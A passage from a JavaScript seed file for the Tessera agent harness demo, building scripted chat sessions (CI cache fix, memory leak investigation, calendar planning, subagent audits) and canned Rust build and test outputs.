- \`crates/server/tests/ready.rs\`: starts a server with migrations paused and checks both answers
- \`crates/server/src/router.rs\`: the route, formatted

All 6 tests pass.`),
      ],
    }),
    S({
      id: 'ses_1d9e4b7a0c52', title: 'Write release notes for 0.1', model: sonnet, created: ago(9 * DAY + 20 * MIN), updated: ago(9 * DAY),
      items: [
        U('Draft release notes for 0.1 from the git log since the first commit. Group by area.'),
        A(md`
# Tessera 0.1

First public release: a self-hosted agent harness you can drive from the terminal, the desktop, or your phone.

### Agent
- Task ledger that survives compaction verbatim
- Steering and follow-up messages while a turn is running
- Automatic compaction at 85% of the context window

### Clients
- Web UI served by \`tessera serve\`; desktop and Android apps via Tauri
- Pairing with 6-digit codes; LAN and remote endpoints with automatic failover

### Providers
- Anthropic, OpenAI-compatible chat, OpenAI Responses, and ChatGPT (Codex) sign-in

### Known issues
- Tabletop posture on foldables is not handled yet
- Search is substring-only until the FTS5 migration lands`),
      ],
    }),
    S({
      id: 'ses_a6c3f0e82b19', title: 'Investigate high memory in tessera serve', model: gpt, thinking: 'high',
      created: ago(12 * DAY + 40 * MIN), updated: ago(12 * DAY),
      items: [
        U('`tessera serve` sits at 1.4 GB RSS after a day. Where is the memory going?'),
        A(TH('Need allocation data, not guesses. heaptrack output was captured yesterday; print the top consumers.'), "Let me look at the heaptrack capture you took yesterday.",
          CALL('call_01', 'bash', { command: 'heaptrack_print heaptrack.tessera.48213.zst | head -n 12' })),
        R('call_01', 'bash', 'reading file "heaptrack.tessera.48213.zst" - please wait, this might take some time...\nMOST MEMORY ALLOCATED:\n1.02G peak memory consumed over 48213 calls from\ntessera_core::session::Session::push_delta\n  at crates/core/src/session.rs:212\n  in tessera-server\n96.40M peak memory consumed over 1204 calls from\nrusqlite::statement::Statement::query_map', { details: { exit_code: 0 } }),
        A(md`
Found it: \`Session::push_delta\` keeps **every stream delta** of every turn so it can rebuild the streaming snapshot, and never clears them when the turn ends.

- Deltas are only needed while a turn is running; the persisted \`Entry\` replaces them
- Fix: store the *accumulated* parts (one \`String\` per index), not the delta list, and drop them on \`stream_ended\`

That turns memory from O(deltas ever streamed) into O(size of the current message).`),
        UH('[Harness restarted] The Tessera server restarted while you were working. This session runs unattended, so it continues on its own. Your last tool calls:\n- completed: `bash` heaptrack_print heaptrack.tessera.48213.zst | head -n 12'),
        A('Picking up after the restart: the heaptrack analysis above is complete, nothing was lost. Next step is the `push_delta` fix.'),
      ],
    }),
    S({
      id: 'ses_3e8b1d6c9a04', title: 'Port CLI flags to clap derive', model: sonnet, created: ago(21 * DAY + 30 * MIN), updated: ago(21 * DAY),
      items: [
        U('Port the CLI flag parsing from the hand-written parser to clap derive. Keep the same flag names.'),
        A(md`
Here's the derive version with identical flag names:

~~~rust
#[derive(Parser, Debug)]
#[command(name = "tessera", version, about = "Self-hosted agent harness")]
pub struct Cli {
    /// Server URL (defaults to the local socket)
    #[arg(long, env = "TESSERA_SERVER")]
    pub server: Option<String>,
    /// Model as provider/model, e.g. anthropic/claude-sonnet-5-5
    #[arg(short, long)]
    pub model: Option<ModelRef>,
    #[arg(short, long, action = clap::ArgAction::Count)]
    pub verbose: u8,
    #[command(subcommand)]
    pub command: Option<Command>,
}
~~~

\`ModelRef\` already implements \`FromStr\`, so clap parses it with no extra code. \`--help\` output is now generated, which also fixes the stale help text for \`--server\`.`),
      ],
    }),
    S({
      id: 'ses_f2a07c5e1b8d', title: 'Website landing page copy', model: sonnet, cwd: `${HOME}/projects/website`,
      created: ago(35 * DAY + HOUR), updated: ago(35 * DAY),
      items: [
        U('Write three options for the landing page headline and subhead. Audience: developers who self-host.'),
        A(md`
**Option A**
> **Your agent, your machine.**
> Tessera runs coding agents on hardware you own and lets you steer them from any device.

**Option B**
> **Start a refactor at your desk. Approve it from the train.**
> A self-hosted agent harness with a real phone app, not a web view of a chat log.

**Option C**
> **Long-running agents without the lock-in.**
> Bring any model: Anthropic, OpenAI, or the llama.cpp box under your desk.

My pick is A for the hero and B's line as the first feature heading: A says what it is, B says why it's different.`),
      ],
    }),
    S({
      id: 'ses_0c5d9e3a7f61', title: 'Tauri Android build setup', model: gpt, created: ago(62 * DAY + HOUR), updated: ago(62 * DAY),
      items: [
        U('`npm run tauri android build` fails with "NDK not found". I have Android Studio installed.'),
        A(md`
Android Studio installs the NDK, but Tauri looks for it through \`NDK_HOME\`, which Studio doesn't set:

~~~sh
export ANDROID_HOME="$HOME/Android/Sdk"
export NDK_HOME="$ANDROID_HOME/ndk/$(ls "$ANDROID_HOME/ndk" | sort -V | tail -n 1)"
rustup target add aarch64-linux-android armv7-linux-androideabi x86_64-linux-android
~~~

Put the two exports in your shell profile, open a new terminal, then run \`npm run tauri android init\` once before building.`),
      ],
    }),
    S({
      id: 'ses_b8f4a1d6e2c7', title: 'Explain Rust pinning', model: haiku, archived: true, cwd: HOME,
      created: ago(95 * DAY + 20 * MIN), updated: ago(95 * DAY),
      items: [
        U('Explain Pin in Rust like I already know how references work.'),
        A(md`
\`Pin<P>\` is a promise about the *pointee*: once pinned, the value won't be moved again until it's dropped.

Why that matters: an \`async fn\` compiles to a state machine that may hold references **into itself** (a borrow that lives across an \`.await\`). Moving it would leave those references dangling, so polling requires \`Pin<&mut Self>\`.

- Most types are \`Unpin\`, and for them \`Pin\` changes nothing
- \`Box::pin(fut)\` is the easy way to get a pinned future on the heap
- \`tokio::pin!(fut)\` pins on the stack without allocating`),
      ],
    }),
    S({
      id: 'ses_64e1b9c3d0a8', title: 'Draft notes on context compaction', model: gemma, thinking: 'off', cwd: `${HOME}/projects/notes`,
      created: ago(49 * DAY + 25 * MIN), updated: ago(49 * DAY),
      items: [
        U('Help me write notes on how context compaction should work in Tessera.'),
        A(md`
## Context compaction

**Trigger:** automatically at 85% of the model's window, or manually with \`/compact [instructions]\`.

**What is kept verbatim**
- The task ledger (goal, plan, decisions, constraints, done criteria)
- Everything from the most recent user message onwards

**What is summarized**
- Earlier conversation, tool calls and their outputs: *what was learned*, not what was printed

**Invariants**
1. Raw history stays in the store; compaction only changes what the model sees
2. \`first_kept_seq\` marks the boundary, so clients can grey out the older part
3. A turn never compacts mid-tool-batch`),
      ],
    }),
    ...seedBotSessions({ t0, today, ago, sonnet, haiku, S, bots }),
  ];
}

// ─── seed: a chat whose background subagents already reported ──────────────
const AUDIT_PARENT_ID = 'ses_7a1c5e93b2d0';
const AUDIT_CHILD_IDS = ['ses_c2e8a4f61b37', 'ses_5d9b0f3e7a24'];
/** A child's transcript from its task template: the prompt, tool steps grouped per response, the report. */
function seedChildItems(task, groups) {
  const items = [U(task.prompt)];
  let k = 0, n = 0;
  for (const [gi, size] of groups.entries()) {
    const steps = task.steps.slice(k, k + size);
    k += size;
    const calls = steps.map((s) => CALL(`call_${String(++n).padStart(2, '0')}`, s.call.name, s.call.args));
    items.push(A(TH(steps.map((s) => s.thinking).join(' ')), ...(gi === 0 ? [task.opener] : []), ...calls));
    steps.forEach((s, i) => items.push(R(calls[i].id, s.call.name, s.call.exec.text, s.call.exec.details ? { details: s.call.exec.details } : {})));
  }
  items.push(A(TH(task.wrap), task.report));
  return items;
}
/** "Audit the reconnect logic": two finished background subagents (5 and 7 steps), their reports, a summary. */
function seedSubagentChat({ t0, today, sonnet, S }) {
  const [map, flaky] = SUBTASKS;
  const [c1, c2] = AUDIT_CHILD_IDS;
  const s0 = Math.min(today(46 * MIN), t0 - 3 * MIN);
  const at = (body, ms) => ({ ...body, ts: s0 + ms });
  const agents = [
    { name: map.name, task: map, child: c1, result: { ok: true } },
    { name: flaky.name, task: flaky, child: c2, result: { ok: true } },
  ];
  const child = (id, task, groups, took) => S({
    id, title: `↳ ${task.name}`, kind: 'subagent', parent_id: AUDIT_PARENT_ID, model: sonnet, permission: 'read_only',
    created: s0 + 14_000, updated: s0 + 14_000 + took, items: seedChildItems(task, groups),
  });
  return [
    S({
      id: AUDIT_PARENT_ID, title: 'Audit the reconnect logic', model: sonnet, created: s0, updated: s0 + 100_000,
      items: [
        at(U('Audit the reconnect logic in the client. Split it up so it goes faster: I want to know exactly how the retry path works, and whether the tests around it can be trusted.'), 0),
        at(A(TH("Two independent questions: how the reconnect path works, and whether its tests are trustworthy. Neither needs the other's answer and both mean reading a lot of code, so delegate them to read-only subagents in the background and keep this context small."),
          "This splits into two independent investigations, so I'll hand them to read-only subagents that run in the background.",
          CALL('call_01', 'agent', { tasks: [map, flaky].map(({ name, prompt }) => ({ name, prompt, readonly: true })), wait: false })), 12_000),
        at(R('call_01', 'agent', startedText([[map.name, c1], [flaky.name, c2]]),
          { details: { subagents: [{ name: map.name, session_id: c1, background: true }, { name: flaky.name, session_id: c2, background: true }] } }), 14_000),
        at(A(md`
Started two subagents in the background:

- **${map.name}** traces the retry loop, the backoff and how state is resynchronised
- **${flaky.name}** looks for sleeps, tight timeouts and shared state in the tests

They report back here as they finish. I'll sum up once both are in.`), 20_000),
        at(UB(`subagent:${c1}`, reportHeader(map.name, 5, '48 s', c1) + map.report), 62_000),
        at(UB(`subagent:${c2}`, reportHeader(flaky.name, 7, '1 min', c2) + flaky.report), 86_000),
        at(A(TH('Both reports are in. Pull out what matters from each and propose an order of work instead of repeating them.'),
          subagentSummary('Both reports are in.', agents)), 100_000),
      ],
    }),
    child(c1, map, [2, 2, 1], 48_000),
    child(c2, flaky, [3, 2, 2], 72_000),
  ];
}

// ─── seed: a finished 24-subagent swarm ("Audit every crate") ───────────────
const SWARM_PARENT_ID = 'ses_3c8d1f5a7e62';
const swarmChildId = (i) => `ses_ac${(i + 1).toString(16).padStart(2, '0')}5e9d3b1f`;
/** A swarm child's transcript: the prompt, one tool call per response, the report. */
function swarmChildItems(task) {
  const items = [U(task.prompt)];
  for (const [i, s] of task.steps.entries()) {
    const id = `call_${String(i + 1).padStart(2, '0')}`;
    items.push(A(TH(s.thinking), ...(i === 0 ? [task.opener] : []), CALL(id, s.call.name, s.call.args)));
    items.push(R(id, s.call.name, s.call.exec.text, s.call.exec.details ? { details: s.call.exec.details } : {}));
  }
  items.push(A(TH(task.wrap), task.report));
  return items;
}
/** "Audit every crate": 24 read-only subagents that ran 4 at a time, their 24 reports and the summary. */
function seedSwarmChat({ t0, today, sonnet, S }) {
  const s0 = Math.min(today(5 * HOUR), t0 - 20 * MIN);
  const at = (body, ms) => ({ ...body, ts: s0 + ms });
  const rnd = mulberry32(2424);
  const free = [14_000, 14_000, 14_000, 14_000]; // when each of the 4 slots frees up
  const runs = AUDIT_TARGETS.map(swarmTask).map((task, i) => {
    const slot = free.indexOf(Math.min(...free));
    const start = free[slot] + 300, took = 4000 + Math.floor(rnd() * 5000);
    free[slot] = start + took;
    return { task, id: swarmChildId(i), start, end: start + took, took };
  });
  const n = runs.length;
  const last = Math.max(...free) + 6000;
  const agents = runs.map((r) => ({ name: r.task.name, task: r.task, child: r.id, result: { ok: true } }));
  const reports = [...runs].sort((a, b) => a.end - b.end)
    .map((r) => at(UB(`subagent:${r.id}`, reportHeader(r.task.name, r.task.steps.length, `${Math.round(r.took / 1000)} s`, r.id) + r.task.report), r.end + 400));
  return [
    S({
      id: SWARM_PARENT_ID, title: 'Audit every crate', model: sonnet, created: s0, updated: s0 + last,
      items: [
        at(U('Audit every crate in the workspace, module by module: panics on untrusted input, leftover TODOs, clippy warnings, and locks held across an await. Fan it out so it goes fast.'), 0),
        at(A(TH(`${n} small, independent checks: one per crate and one per core module. Fan them out to read-only subagents in the background; the server runs ${MAX_SUBAGENTS} at a time and queues the rest, so start them all at once and don't poll.`),
          `That's ${n} independent checks, so I'll fan them out to read-only subagents. ${MAX_SUBAGENTS} run at a time; the rest wait for a slot.`,
          CALL('call_01', 'agent', { tasks: runs.map(({ task }) => ({ name: task.name, prompt: task.prompt, readonly: true })), wait: false })), 10_000),
        at(R('call_01', 'agent', startedText(runs.map((r) => [r.task.name, r.id])),
          { details: { subagents: runs.map((r) => ({ name: r.task.name, session_id: r.id, background: true })) } }), 12_000),
        at(A(swarmStartedText(n)), 13_000),
        ...reports,
        at(A(TH(`All ${n} reports are in. Count the verdicts, surface only what needs attention, and propose one order of work.`),
          swarmSummary(`All ${n} reports are in.`, agents)), last),
      ],
    }),
    ...runs.map((r) => S({
      id: r.id, title: `↳ ${r.task.name}`, kind: 'subagent', parent_id: SWARM_PARENT_ID, model: sonnet, permission: 'read_only',
      created: s0 + r.start, updated: s0 + r.end, items: swarmChildItems(r.task),
    })),
  ];
}

// ─── seed: bot chats, the room, the private DM and a duty run ───────────────
const CAL_WEEK = [
  'Mon  09:30–10:00  Stand-up',
  '     14:00–15:00  1:1 with Sam',
  'Tue  09:30–10:00  Stand-up',
  'Wed  09:30–10:00  Stand-up',
  '     11:00–11:30  Dentist',
  'Thu  09:30–10:00  Stand-up',
  '     16:00–17:00  Launch',
  'Fri  (nothing booked)',
].join('\n');
const CAL_TODAY = [
  'Today',
  '  09:30–10:00  Stand-up (video)',
  '  14:00–14:30  Design review: foldable layout',
  '  free after 14:30',
  'Tomorrow',
  '  09:00–12:00  Focus: Android layout',
  'Thursday',
  '  10:00–10:45  Launch checklist',
  '  16:00–17:00  Launch',
].join('\n');
const CI_DIFF = md`
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -14,6 +14,9 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - uses: dtolnay/rust-toolchain@stable
+      - uses: Swatinem/rust-cache@v2
+        with:
+          shared-key: tessera
       - run: cargo test --workspace
`;
function seedBotSessions({ t0, today, ago, sonnet, S, bots }) {
  const bot = (id) => bots.find((b) => b.id === id);
  const nova = bot(NOVA), forge = bot(FORGE), scout = bot(SCOUT);
  const roomSources = [SOURCES[0], SOURCES[1], SOURCES[3]];
  const briefingAt = briefingRunAt(t0);
  return [
    S({
      id: 'ses_4b7d2e9a0c15', title: 'Launch planning', kind: 'channel', members: [NOVA, FORGE, SCOUT], model: sonnet,
      created: today(80 * MIN), updated: today(60 * MIN),
      items: [
        U('@scout what are other self-hosted agent tools doing for multi-agent? @forge is main green?'),
        BA(scout, TH('Two questions; mine is how other self-hosted agent tools handle multi-agent. Search, then summarise the patterns rather than listing products.'),
          'Looking.', CALL('call_01', 'web_search', { query: 'self-hosted agent harness multi-agent rooms hand-off' })),
        R('call_01', 'web_search', searchResultText('self-hosted agent harness multi-agent rooms hand-off', [...roomSources, SOURCES[2]])),
        BA(scout, md`
Three patterns keep coming up:

- **Rooms with hand-offs:** agents share a thread and @mention each other to pass the floor, with a cap on turns per message ([Hivemind](${roomSources[0].url}))
- **Private agent-to-agent threads** the user can audit, each agent keeping its own tools and memory ([Quorum 0.9](${roomSources[1].url}))
- **Supervisor/worker:** one coordinator talks to the user and the workers never do ([Relay docs](${roomSources[2].url}))

We already do the first two. Nobody I found has per-bot permission modes, which is worth a line in the launch post. Confidence: medium, since two of the three are changelogs rather than docs.`),
        BA(forge, TH("Is main green: run the suite, don't guess."), 'Checking.', CALL('call_02', 'bash', { command: 'cargo test --workspace' })),
        R('call_02', 'bash', WORKSPACE_TEST_OUTPUT, { details: { exit_code: 0 } }),
        BA(forge, 'Green. 21 passed, 0 failed, 14.8s. CI has been clean since the reconnect fix.'),
        U('Nice. Nova, put the launch checklist on my Thursday.'),
        BA(nova, TH('Thursday is launch day; the checklist should come before the 16:00 launch with time to act on it. 10:00 for 45 minutes, with a reminder.'),
          'On it!', CALL('call_03', 'calendar', { action: 'add', title: 'Launch checklist', when: 'Thursday 10:00', duration: '45m', reminder: '15m' })),
        R('call_03', 'calendar', 'Added "Launch checklist" on Thursday, 10:00–10:45 (reminder 15 minutes before).'),
        BA(nova, md`
Done! **Launch checklist** is on Thursday at 10:00 for 45 minutes, with a reminder 15 minutes before.

I've added what's open so far:
- Scout's multi-agent comparison, for the launch post
- A final \`cargo test --workspace\` on the release tag

@forge, anything on the build side that should go on the list?`),
        BA(forge, 'Two: tag `v0.2.0` once the FTS5 migration merges, and bump the NDK for the Android build. Add those.'),
      ],
    }),
    S({
      id: 'ses_d4f0b7e21a93', title: dmTitle(nova, forge), kind: 'channel', bot_id: FORGE, members: [NOVA, FORGE],
      model: forge.model, thinking: forge.thinking, permission: forge.permission, cwd: forge.cwd,
      created: today(3 * HOUR + 10 * MIN), updated: today(3 * HOUR),
      items: [
        UB(NOVA, "Hi Forge, the user wants build status in tomorrow's morning briefing. Is main green, and is anything flaky?"),
        A(TH('Run the suite rather than trusting the last CI badge.'), 'Running the suite.', CALL('call_01', 'bash', { command: 'cargo test --workspace' })),
        R('call_01', 'bash', WORKSPACE_TEST_OUTPUT, { details: { exit_code: 0 } }),
        A('Green: 21 passed, 0 failed, 14.8s. One test was flaky last week (`reconnect_resumes_since_seq`, 3 in 50 runs); the fix landed and it has passed 500 of 500 since. Nothing else.'),
        UB(NOVA, "Thanks! Anything the user needs to decide before Thursday's launch?"),
        A(TH('Only one open decision on my side: whether 0.2 ships with the FTS5 migration.'),
          'One: whether 0.2 ships with the FTS5 search migration or waits for 0.2.1. It is done and tested. I would ship it.'),
      ],
    }),
    S({
      id: 'ses_6f2c0a9d3e18', title: 'Plan my week', bot_id: NOVA, model: sonnet, cwd: nova.cwd, permission: nova.permission,
      created: ago(DAY + 35 * MIN), updated: ago(DAY),
      items: [
        U('Plan my week. Launch is Thursday, and I want two focused mornings for the Android layout work.'),
        A(TH("Two deep-work mornings plus a launch on Thursday. Check the calendar first so I don't double-book anything."),
          'Let me look at your week first.', CALL('call_01', 'calendar', { action: 'list', range: 'this week' })),
        R('call_01', 'calendar', CAL_WEEK),
        A(TH('Tuesday morning is free. Wednesday is broken up by the dentist at 11:00. Keep Thursday calm for the launch.'), md`
Here's a week that protects your focus time and keeps Thursday calm:

| Day | Morning | Afternoon |
|---|---|---|
| Mon | Stand-up, then admin | 1:1 with Sam |
| Tue | **Focus: Android layout** (10:00–12:30) | Reviews |
| Wed | **Focus: Android layout** (09:00–11:00) | Launch prep |
| Thu | Stand-up, then a buffer | **Launch** at 16:00 |
| Fri | Retro | Light, on purpose |

The dentist at 11:00 on Wednesday cuts your second focus block short. If you can move it, Wednesday becomes a full morning.

I've blocked Tuesday's focus time already. Shall I try to move the dentist?`),
        U('Move the dentist to next week if you can.'),
        A('Moving it now.', CALL('call_02', 'calendar', { action: 'move', event: 'Dentist', to: 'next Tuesday 16:30' })),
        R('call_02', 'calendar', 'Moved "Dentist" to Tuesday next week, 16:30–17:00. The practice sent a confirmation email.'),
        A("Done! The dentist is now next Tuesday at 16:30, and the confirmation is in your inbox. That frees Wednesday morning completely, so both focus blocks are 09:00–12:00. I'll remind you the evening before each one."),
        LEARNED([
          { kind: 'profile', action: 'added', text: 'Protects mornings for deep work; prefers two focus blocks a week' },
          { kind: 'profile', action: 'updated', text: 'Dentist: Dr. Okafor, afternoons only' },
          { kind: 'note', action: 'added', text: 'Launch is on Thursday at 16:00; keep that day calm' },
          { kind: 'skill', action: 'updated', text: 'weekly-planning' },
          { kind: 'note', action: 'removed', text: 'Stand-up moved to 09:30' },
        ]),
      ],
    }),
    S({
      id: 'ses_9e41b7d05c2a', title: 'Why is CI slow?', bot_id: FORGE, model: forge.model, thinking: forge.thinking, permission: forge.permission, cwd: forge.cwd,
      created: today(5.5 * HOUR), updated: today(5 * HOUR),
      items: [
        U('Why is CI slow? The workflow takes 14 minutes now; it used to be 5.'),
        A(TH('14 minutes versus 5 is almost always the cache. Check the workflow for a cache step.'), 'Checking the workflow.',
          CALL('call_01', 'bash', { command: 'grep -nE "cache|sccache" .github/workflows/ci.yml; echo "exit=$?"' })),
        R('call_01', 'bash', 'exit=1', { details: { exit_code: 0 } }),
        A(TH('No cache step at all. Confirm with a cold build timing.'),
          CALL('call_02', 'bash', { command: 'cargo clean -q && cargo build --workspace --timings 2>&1 | tail -n 2' })),
        R('call_02', 'bash', '    Finished `dev` profile [unoptimized + debuginfo] target(s) in 10m 48s\n      Timing report saved to target/cargo-timings/cargo-timing.html', { details: { exit_code: 0 } }),
        A(md`
No build cache. Every run compiles all 341 crates cold: about 11 of your 14 minutes.

Fix:

~~~yaml
- uses: Swatinem/rust-cache@v2
  with:
    shared-key: tessera
~~~

Expect about 4 minutes on warm runs. Want it?`),
        U('Do it.'),
        A('Adding it.', CALL('call_03', 'edit', {
          path: '.github/workflows/ci.yml',
          old_string: '      - uses: dtolnay/rust-toolchain@stable\n',
          new_string: '      - uses: dtolnay/rust-toolchain@stable\n      - uses: Swatinem/rust-cache@v2\n        with:\n          shared-key: tessera\n',
        })),
        R('call_03', 'edit', 'Edited .github/workflows/ci.yml: 1 replacement (+3 −0)', { details: { diff: CI_DIFF } }),
        A('Done, on branch `ci/rust-cache`. First run warms the cache; after that about 4 minutes. Not pushed.'),
      ],
    }),
    S({
      id: BRIEFING_SESSION_ID, title: 'Morning briefing', kind: 'job', bot_id: NOVA, model: sonnet, cwd: HOME, permission: 'default',
      created: briefingAt + 2000, updated: briefingAt + 1.4 * MIN,
      items: [
        UB(`job:${BRIEFING_JOB_ID}`, BRIEFING_PROMPT),
        A(TH('Scheduled briefing. Calendar first, then inbox, then the news feeds; keep it to one screen.'),
          'Pulling today together.', CALL('call_01', 'calendar', { action: 'list', range: 'today' })),
        R('call_01', 'calendar', CAL_TODAY),
        A(briefingText()),
      ],
    }),
  ];
}

// ─── scenario content ───────────────────────────────────────────────────────
const WORKSPACE_TEST_OUTPUT = [
  ...['proto', 'core', 'client', 'server', 'cli'].map((c) => `   Compiling tessera-${c} v0.1.0 (/home/user/projects/tessera/crates/${c})`),
  '    Finished `test` profile [unoptimized + debuginfo] target(s) in 14.82s',
  testBlock('unittests src/lib.rs (target/debug/deps/tessera_core-3b1f0c9a8e2d4f61)', CORE_TESTS, '0.41'),
  testBlock('unittests src/lib.rs (target/debug/deps/tessera_proto-9c2e7d1a0b3f5e88)',
    ['tests::model_ref_parse', 'tests::request_roundtrip', 'tests::server_message_shapes'], '0.00'),
  testBlock('unittests src/main.rs (target/debug/deps/tessera_server-5d0c2f8e1a7b9c34)',
    ['pair::tests::code_is_single_use', 'pair::tests::expired_code_is_rejected', 'ws::tests::accepts_bearer_header',
      'ws::tests::accepts_query_token', 'ws::tests::events_reach_every_connection', 'ws::tests::rejects_missing_token'], '0.18'),
].join('\n').trimEnd();
const SERVER_TEST_OUTPUT = [
  ...['proto', 'core', 'server'].map((c) => `   Compiling tessera-${c} v0.1.0 (/home/user/projects/tessera/crates/${c})`),
  '    Finished `test` profile [unoptimized + debuginfo] target(s) in 11.37s',
  testBlock('unittests src/main.rs (target/debug/deps/tessera_server-5d0c2f8e1a7b9c34)',
    ['pair::tests::code_is_single_use', 'pair::tests::expired_code_is_rejected', 'pair::tests::rate_limit_after_five_attempts',
      'static_files::tests::spa_fallback_serves_index', 'ws::tests::accepts_bearer_header', 'ws::tests::accepts_query_token',
      'ws::tests::events_reach_every_connection', 'ws::tests::lagged_receiver_gets_notice', 'ws::tests::rejects_missing_token'], '0.62'),
].join('\n').trimEnd();
const BUILD_OUTPUT = [
  '   Compiling proc-macro2 v1.0.101', '   Compiling serde v1.0.228', '   Compiling tokio v1.48.0',
  '   Compiling rusqlite v0.37.0', '   Compiling axum v0.8.6',
  ...['proto', 'core', 'server', 'cli'].map((c) => `   Compiling tessera-${c} v0.1.0 (/home/user/projects/tessera/crates/${c})`),
  '    Finished `release` profile [optimized] target(s) in 1m 12s',
].join('\n');
const FAIL_OUTPUT = [
  '   Compiling tessera-core v0.1.0 (/home/user/projects/tessera/crates/core)',
  '    Finished `test` profile [unoptimized + debuginfo] target(s) in 6.02s',
  '     Running unittests src/lib.rs (target/debug/deps/tessera_core-3b1f0c9a8e2d4f61)', '',
  'running 12 tests',
  ...CORE_TESTS.map((n) => `test ${n} ... ${n.endsWith('since_seq_returns_tail') ? 'FAILED' : 'ok'}`), '',
  'failures:', '', '---- store::tests::since_seq_returns_tail stdout ----', '',
  "thread 'store::tests::since_seq_returns_tail' panicked at crates/core/src/store.rs:214:9:",
  'assertion `left == right` failed', '  left: [4, 5, 6]', ' right: [5, 6]',
  'note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace', '', '',
  'failures:', '    store::tests::since_seq_returns_tail', '',
  'test result: FAILED. 11 passed; 1 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.38s', '',
  'error: test failed, to rerun pass `-p tessera-core --lib`',
].join('\n');
const DEPLOY_OUTPUT = [
  '==> Building tessera 0.1.0 (release, x86_64-unknown-linux-musl)',
  '==> Uploading tessera-0.1.0-x86_64-linux.tar.gz (8.4 MB) to staging.internal',
  '==> Restarting tessera.service on staging.internal',
  '==> Health check https://staging.internal/api/health ... ok (protocol 1)',
  'Deployed 0.1.0 to staging in 38s',
].join('\n');

const MAIN_OLD = md`
use std::process::ExitCode;

use tessera_cli::{run, Cli};

fn main() -> ExitCode {
    let cli = Cli::parse_args();
    let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
        Ok(rt) => rt,
        Err(err) => {
            eprintln!("failed to start runtime: {err}");
            return ExitCode::FAILURE;
        }
    };
    match rt.block_on(run(cli)) {
        Ok(()) => ExitCode::SUCCESS,
        Err(err) => {
            eprintln!("error: {err:#}");
            ExitCode::FAILURE
        }
    }
}`;
const MAIN_NEW = md`
use anyhow::Context;

use tessera_cli::{init_tracing, run, Cli};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let cli = Cli::parse_args();
    init_tracing(cli.verbose);
    run(cli).await.context("tessera exited with an error")
}`;
const MAIN_DIFF = md`
--- a/src/main.rs
+++ b/src/main.rs
@@ -1,21 +1,10 @@
-use std::process::ExitCode;
+use anyhow::Context;
 
-use tessera_cli::{run, Cli};
+use tessera_cli::{init_tracing, run, Cli};
 
-fn main() -> ExitCode {
+#[tokio::main]
+async fn main() -> anyhow::Result<()> {
     let cli = Cli::parse_args();
-    let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
-        Ok(rt) => rt,
-        Err(err) => {
-            eprintln!("failed to start runtime: {err}");
-            return ExitCode::FAILURE;
-        }
-    };
-    match rt.block_on(run(cli)) {
-        Ok(()) => ExitCode::SUCCESS,
-        Err(err) => {
-            eprintln!("error: {err:#}");
-            ExitCode::FAILURE
-        }
-    }
+    init_tracing(cli.verbose);
+    run(cli).await.context("tessera exited with an error")
 }
`;

const WS_SRC = md`
    loop {
        tokio::select! {
            msg = socket.recv() => match msg {
                Some(Ok(Message::Text(text))) => handle_text(&state, &mut socket, text).await?,
                Some(Ok(Message::Close(_))) | None => break,
                Some(Ok(_)) => {}
                Some(Err(err)) => return Err(err.into()),
            },
            event = events.recv() => {
                let event = event?;
                send_json(&mut socket, &ServerMessage::Event { event }).await?;
            }
        }
    }
    Ok(())
}`;
const WS_OLD = md`
            event = events.recv() => {
                let event = event?;
                send_json(&mut socket, &ServerMessage::Event { event }).await?;
            }`;
const WS_NEW = md`
            event = events.recv() => match event {
                Ok(event) => send_json(&mut socket, &ServerMessage::Event { event }).await?,
                Err(broadcast::error::RecvError::Lagged(missed)) => {
                    // The client resynchronises with get_session { since_seq },
                    // so dropping live events is safe; dropping the socket is not.
                    tracing::warn!(%device, missed, "event receiver lagged; client will resync");
                    let notice = Event::Notice { session_id: None, level: NoticeLevel::Warning, message: format!("Missed {missed} live events; resyncing") };
                    send_json(&mut socket, &ServerMessage::Event { event: notice }).await?;
                }
                Err(broadcast::error::RecvError::Closed) => break,
            },`;
const WS_DIFF = md`
--- a/crates/server/src/ws.rs
+++ b/crates/server/src/ws.rs
@@ -52,8 +52,15 @@ async fn serve_socket(state: AppState, mut socket: WebSocket, device: DeviceId) -> Result<()> {
                 Some(Err(err)) => return Err(err.into()),
             },
-            event = events.recv() => {
-                let event = event?;
-                send_json(&mut socket, &ServerMessage::Event { event }).await?;
-            }
${WS_NEW.split('\n').map((l) => '+' + l).join('\n')}
         }
     }
`;

function demoFinal(denied) {
  return md`
## Demo complete

Here's what just happened, end to end:

1. **Planned** the work in the task ledger (goal, plan, done criteria)
2. **Baselined** with \`cargo test --workspace\`: 21 passed, 0 failed
3. **Edited** \`src/main.rs\` to use \`#[tokio::main]\` and \`anyhow\` instead of a hand-built runtime
4. ${denied ? '**Skipped** clearing `target/debug/incremental`, because you denied it' : '**Cleared** `target/debug/incremental` after you approved it'}

~~~rust
#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let cli = Cli::parse_args();
    init_tracing(cli.verbose);
    run(cli).await.context("tessera exited with an error")
}
~~~

| Step | Tool | Result |
|---|---|---|
| Plan | \`task\` | 4 items |
| Baseline | \`bash\` | 21 passed |
| Refactor | \`edit\` | +6 −17 |
| Cleanup | \`bash\` (${denied ? 'denied' : 'approved'}) | ${denied ? 'skipped' : 'freed 1.3 GB'} |

The entry point is now 10 lines instead of 21, and errors keep their context all the way up. A natural next step is a \`cargo clippy --workspace\` pass; say the word and I'll run it.`;
}

const TEST_ANSWER = md`
All 9 tests in \`tessera-server\` pass (0.62s).

- **Pairing:** single-use codes, expiry and rate limiting are covered
- **WebSocket auth:** query token, bearer header, and missing-token rejection
- \`lagged_receiver_gets_notice\` confirms slow clients are told to resync instead of being dropped

Nothing flaky showed up in this run. For more confidence I can loop the WebSocket tests 100 times with \`--test-threads=1\`.`;
const BUILD_ANSWER = md`
Release build succeeded in 1m 12s with no warnings.

| Artifact | Size |
|---|---:|
| \`target/release/tessera\` | 18.4 MB |
| stripped | 11.9 MB |

~~~sh
strip target/release/tessera && ls -lh target/release/tessera
~~~

If size matters for the Android sidecar, \`opt-level = "z"\` plus \`lto = "fat"\` in \`[profile.release]\` usually saves another 25-30%.`;
const EDIT_ANSWER = md`
Fixed. The WebSocket loop treated a lagged broadcast receiver as a fatal error, so any client that fell more than 256 events behind (a phone on a slow connection during a long stream) was disconnected mid-turn.

